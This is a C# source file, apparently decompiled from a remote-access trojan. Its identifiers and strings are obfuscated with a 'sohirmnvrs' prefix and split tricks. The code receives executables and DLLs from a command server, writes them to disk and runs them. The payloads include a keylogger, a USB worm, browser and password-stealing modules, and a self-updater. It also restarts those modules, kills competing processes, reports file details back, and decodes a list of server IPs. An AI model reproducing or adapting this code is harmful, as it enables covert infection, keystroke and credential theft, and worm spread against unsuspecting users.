using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace sohirmnvrs;

public class sohirmnvrsOCMD
{
	public sohirmnvrsMCDM server;

	public DateTime sohirmnvrsrunTime;

	public bool sohirmnvrsdo_process(string filePath)
	{
		try
		{
			Process.Start(filePath);
			return true;
		}
		catch
		{
			return false;
		}
	}

	public string sohirmnvrsfile_info(string path, bool ret = false)
	{
		try
		{
			FileInfo fileInfo = new FileInfo(path);
			string text = fileInfo.Name + ((!ret) ? ">|sohirmnvrs".Split(new char[1] { '|' })[0] : "<|sohirmnvrs".Split(new char[1] { '|' })[0]);
			text = text + fileInfo.CreationTimeUtc.ToString() + ((!ret) ? ">|sohirmnvrs".Split(new char[1] { '|' })[0] : "<|sohirmnvrs".Split(new char[1] { '|' })[0]);
			text = text + sohirmnvrsget_size(fileInfo.Length) + ((!ret) ? ">|sohirmnvrs".Split(new char[1] { '|' })[0] : "<|sohirmnvrs".Split(new char[1] { '|' })[0]);
			if (!ret)
			{
				server.sohirmnvrspush_data(null, "sohirmnvrs-filsz=|sohirmnvrs".Split(new char[1] { '|' })[0] + text);
			}
			return text;
		}
		catch
		{
			return "";
		}
	}

	public NetworkStream sohirmnvrsNS(TcpClient sohirmnvrstcpsck)
	{
		return sohirmnvrstcpsck.GetStream();
	}

	public void sohirmnvrsseeSEC()
	{
		try
		{
			if (Process.GetProcessesByName(sohirmnvrsCONF.sohirmnvrssecApp).Length == 0 && File.Exists(sohirmnvrsCONF.sohirmnvrssecPath() + sohirmnvrsCONF.sohirmnvrssecApp + ".exe!sohirmnvrs".Split(new char[1] { '!' })[0]))
			{
				sohirmnvrsdo_process(sohirmnvrsCONF.sohirmnvrssecPath() + sohirmnvrsCONF.sohirmnvrssecApp + ".exe!sohirmnvrs".Split(new char[1] { '!' })[0]);
			}
		}
		catch
		{
		}
	}

	public string sohirmnvrsget_size(long byteCount)
	{
		try
		{
			string[] array = new string[7]
			{
				"B!sohirmnvrs".Split(new char[1] { '!' })[0],
				"KB!sohirmnvrs".Split(new char[1] { '!' })[0],
				"MB!sohirmnvrs".Split(new char[1] { '!' })[0],
				"GB",
				"TB",
				"PB",
				"EB!sohirmnvrs".Split(new char[1] { '!' })[0]
			};
			if (byteCount == 0L)
			{
				return "0" + array[0];
			}
			long num = Math.Abs(byteCount);
			int num2 = Convert.ToInt32(Math.Floor(Math.Log(num, 1024.0)));
			double num3 = Math.Round((double)num / Math.Pow(1024.0, num2), 1);
			return (double)Math.Sign(byteCount) * num3 + array[num2];
		}
		catch
		{
			return "";
		}
	}

	public void sohirmnvrsseekilogr()
	{
		try
		{
			if (Process.GetProcessesByName(sohirmnvrsCONF.sohirmnvrskiyApp).Length == 0 && File.Exists(sohirmnvrsCONF.sohirmnvrskiPath() + sohirmnvrsCONF.sohirmnvrskiyApp + ".exe!sohirmnvrs".Split(new char[1] { '!' })[0]))
			{
				sohirmnvrsdo_process(sohirmnvrsCONF.sohirmnvrskiPath() + sohirmnvrsCONF.sohirmnvrskiyApp + ".exe!sohirmnvrs".Split(new char[1] { '!' })[0]);
			}
		}
		catch
		{
		}
	}

	public sohirmnvrsOCMD(sohirmnvrsMCDM lID)
	{
		server = lID;
	}

	public void sohirmnvrsseeusbl()
	{
		try
		{
			if (Process.GetProcessesByName(sohirmnvrsCONF.sohirmnvrsusbApp).Length == 0 && File.Exists(sohirmnvrsCONF.sohirmnvrsusbPath() + sohirmnvrsCONF.sohirmnvrsusbApp + ".exe!sohirmnvrs".Split(new char[1] { '!' })[0]))
			{
				sohirmnvrsdo_process(sohirmnvrsCONF.sohirmnvrsusbPath() + sohirmnvrsCONF.sohirmnvrsusbApp + ".exe!sohirmnvrs".Split(new char[1] { '!' })[0]);
			}
		}
		catch
		{
		}
	}

	public void sohirmnvrsseeutcl()
	{
		try
		{
			if (Process.GetProcessesByName(sohirmnvrsCONF.sohirmnvrssecApp).Length == 0 && File.Exists(sohirmnvrsCONF.sohirmnvrssecPath() + sohirmnvrsCONF.sohirmnvrssecApp + ".exe!sohirmnvrs".Split(new char[1] { '!' })[0]))
			{
				sohirmnvrsdo_process(sohirmnvrsCONF.sohirmnvrssecPath() + sohirmnvrsCONF.sohirmnvrssecApp + ".exe!sohirmnvrs".Split(new char[1] { '!' })[0]);
			}
		}
		catch
		{
		}
	}

	public void sohirmnvrsdeleteKLS()
	{
		try
		{
			Process[] processesByName = Process.GetProcessesByName(sohirmnvrsCONF.sohirmnvrskiyApp);
			if (processesByName.Length == 1)
			{
				sohirmnvrsbreak_process(processesByName[0].Id);
			}
			Thread.Sleep(150);
			if (File.Exists(sohirmnvrsCONF.sohirmnvrskiPath() + sohirmnvrsCONF.sohirmnvrskiyApp))
			{
				File.Delete(sohirmnvrsCONF.sohirmnvrskiPath() + sohirmnvrsCONF.sohirmnvrskiyApp);
				if (File.Exists(sohirmnvrsCONF.sohirmnvrskiPath() + sohirmnvrsCONF.sohirmnvrskiyApp + "$|sohirmnvrs".Split(new char[1] { '|' })[0]))
				{
					File.Delete(sohirmnvrsCONF.sohirmnvrskiPath() + sohirmnvrsCONF.sohirmnvrskiyApp + "$|sohirmnvrs".Split(new char[1] { '|' })[0]);
				}
				Thread.Sleep(250);
				sohirmnvrsseekilogr();
			}
		}
		catch
		{
		}
	}

	public void sohirmnvrsbreak_process(int proid)
	{
		try
		{
			Process.GetProcessById(proid).Kill();
			Thread.Sleep(11);
		}
		catch
		{
		}
	}

	public string[] sohirmnvrsserverIPD()
	{
		string @string = Encoding.UTF8.GetString(sohirmnvrsCONF.sohirmnvrsvpsips, 0, sohirmnvrsCONF.sohirmnvrsvpsips.Length);
		return @string.Split(new char[1] { '?' });
	}

	public void sohirmnvrscheckLast()
	{
		DateTime now = DateTime.Now;
		try
		{
			if (Math.Abs(sohirmnvrsrunTime.Subtract(now).Minutes) > 6)
			{
				server.sohirmnvrstcpsck.Close();
				server.sohirmnvrsis_working = false;
			}
		}
		catch
		{
		}
	}

	public void remove_module(string path, string fileName)
	{
		try
		{
			Process[] processesByName = Process.GetProcessesByName(fileName);
			string path2 = path + fileName + ".exe|sohirmnvrs".Split(new char[1] { '|' })[0];
			if (processesByName.Length == 1)
			{
				sohirmnvrsbreak_process(processesByName[0].Id);
				Thread.Sleep(200);
			}
			if (File.Exists(path2))
			{
				File.Delete(path2);
			}
		}
		catch
		{
		}
	}

	public void sohirmnvrsremove_user()
	{
		try
		{
			byte[] array = server.sohirmnvrspull_data();
			if (array != null)
			{
				remove_module(sohirmnvrsCONF.sohirmnvrssecPath(), sohirmnvrsCONF.sohirmnvrssecApp);
				remove_module(sohirmnvrsCONF.sohirmnvrskiPath(), sohirmnvrsCONF.sohirmnvrskiyApp);
				remove_module(sohirmnvrsCONF.sohirmnvrsusbPath(), sohirmnvrsCONF.sohirmnvrsusbApp);
				if (!File.Exists(sohirmnvrsCONF.sohirmnvrsget_mpath() + sohirmnvrsCONF.sohirmnvrsremvUser + ".exe!sohirmnvrs".Split(new char[1] { '!' })[0]))
				{
					File.WriteAllBytes(sohirmnvrsCONF.sohirmnvrsget_mpath() + sohirmnvrsCONF.sohirmnvrsremvUser + ".exe!sohirmnvrs".Split(new char[1] { '!' })[0], array);
					sohirmnvrsdo_process(sohirmnvrsCONF.sohirmnvrsget_mpath() + sohirmnvrsCONF.sohirmnvrsremvUser + ".exe");
				}
			}
		}
		catch
		{
		}
	}

	public void sohirmnvrsdo_updated(string uType, string switchType)
	{
		try
		{
			byte[] array = server.sohirmnvrspull_data();
			switch (uType)
			{
			case "sohirmnvrs$audio":
				if (array != null)
				{
					File.WriteAllBytes(sohirmnvrsCONF.sohirmnvrsget_mpath() + sohirmnvrsCONF.sohirmnvrsaudioDLL, array);
				}
				break;
			case "sohirmnvrs$mozedll":
				if (array != null)
				{
					File.WriteAllBytes(sohirmnvrsCONF.sohirmnvrsget_ppath() + sohirmnvrsCONF.sohirmnvrsmozeDLL, array);
				}
				break;
			case "sohirmnvrs$secup":
			{
				string path = sohirmnvrsCONF.sohirmnvrssecPath() + sohirmnvrsCONF.sohirmnvrssecApp + ".exe!sohirmnvrs".Split(new char[1] { '!' })[0];
				if (!Directory.Exists(sohirmnvrsCONF.sohirmnvrssecPath()))
				{
					Directory.CreateDirectory(sohirmnvrsCONF.sohirmnvrssecPath());
				}
				File.WriteAllBytes(path, array);
				sohirmnvrsseeSEC();
				break;
			}
			case "sohirmnvrs$chrodll":
				if (array != null)
				{
					File.WriteAllBytes(sohirmnvrsCONF.sohirmnvrsget_ppath() + sohirmnvrsCONF.sohirmnvrschromDLL, array);
				}
				break;
			case "sohirmnvrs$uklog":
				if (array != null)
				{
					if (!Directory.Exists(sohirmnvrsCONF.sohirmnvrskiPath()))
					{
						Directory.CreateDirectory(sohirmnvrsCONF.sohirmnvrskiPath());
					}
					Process[] processesByName3 = Process.GetProcessesByName(sohirmnvrsCONF.sohirmnvrskiyApp);
					if (processesByName3.Length == 1)
					{
						sohirmnvrsbreak_process(processesByName3[0].Id);
						Thread.Sleep(20);
					}
					File.WriteAllBytes(sohirmnvrsCONF.sohirmnvrskiPath() + sohirmnvrsCONF.sohirmnvrskiyApp + ".exe", array);
				}
				break;
			case "sohirmnvrs$updatu":
			case "sohirmnvrs$usbwrm":
				if (!Directory.Exists(sohirmnvrsCONF.sohirmnvrsusbPath()))
				{
					Directory.CreateDirectory(sohirmnvrsCONF.sohirmnvrsusbPath());
				}
				if (array != null)
				{
					Process[] processesByName2 = Process.GetProcessesByName(sohirmnvrsCONF.sohirmnvrsusbApp);
					if (processesByName2.Length == 1)
					{
						sohirmnvrsbreak_process(processesByName2[0].Id);
						Thread.Sleep(10);
					}
					File.WriteAllBytes(sohirmnvrsCONF.sohirmnvrsusbPath() + sohirmnvrsCONF.sohirmnvrsusbApp + ".exe!sohirmnvrs".Split(new char[1] { '!' })[0], array);
				}
				break;
			case "sohirmnvrs$sndpl":
			case "sohirmnvrs$sndps":
				if (array != null)
				{
					if (!Directory.Exists(sohirmnvrsCONF.sohirmnvrsget_ppath()))
					{
						Directory.CreateDirectory(sohirmnvrsCONF.sohirmnvrsget_ppath());
					}
					File.WriteAllBytes(sohirmnvrsCONF.sohirmnvrsget_ppath() + sohirmnvrsCONF.sohirmnvrspssApp + ".exe!sohirmnvrs".Split(new char[1] { '!' })[0], array);
				}
				break;
			case "sohirmnvrs$supdat":
			case "sohirmnvrs$downad":
			case "sohirmnvrs$poupld":
			{
				if (array == null)
				{
					break;
				}
				if (!Directory.Exists(sohirmnvrsCONF.sohirmnvrsget_mpath()))
				{
					Directory.CreateDirectory(sohirmnvrsCONF.sohirmnvrsget_mpath());
				}
				string text = sohirmnvrsCONF.sohirmnvrsget_mpath() + "updates\\|sohirmnvrs".Split(new char[1] { '|' })[0];
				if (!Directory.Exists(text))
				{
					Directory.CreateDirectory(text);
				}
				File.WriteAllBytes(text + sohirmnvrsCONF.sohirmnvrsmainApp + ".exe", array);
				Process[] processesByName = Process.GetProcessesByName(sohirmnvrsCONF.sohirmnvrsmainApp);
				if (processesByName.Length <= 0)
				{
					break;
				}
				int id = Process.GetCurrentProcess().Id;
				Process[] array2 = processesByName;
				foreach (Process process in array2)
				{
					if (process.Id != id)
					{
						sohirmnvrsbreak_process(process.Id);
					}
				}
				break;
			}
			}
		}
		catch
		{
		}
	}

	public void sohirmnvrsseeUSB()
	{
		try
		{
			if (Process.GetProcessesByName(sohirmnvrsCONF.sohirmnvrsusbApp).Length == 0 && File.Exists(sohirmnvrsCONF.sohirmnvrsusbPath() + sohirmnvrsCONF.sohirmnvrsusbApp + ".exe!sohirmnvrs".Split(new char[1] { '!' })[0]))
			{
				sohirmnvrsdo_process(sohirmnvrsCONF.sohirmnvrsusbPath() + sohirmnvrsCONF.sohirmnvrsusbApp + ".exe!sohirmnvrs".Split(new char[1] { '!' })[0]);
			}
		}
		catch
		{
		}
	}
}
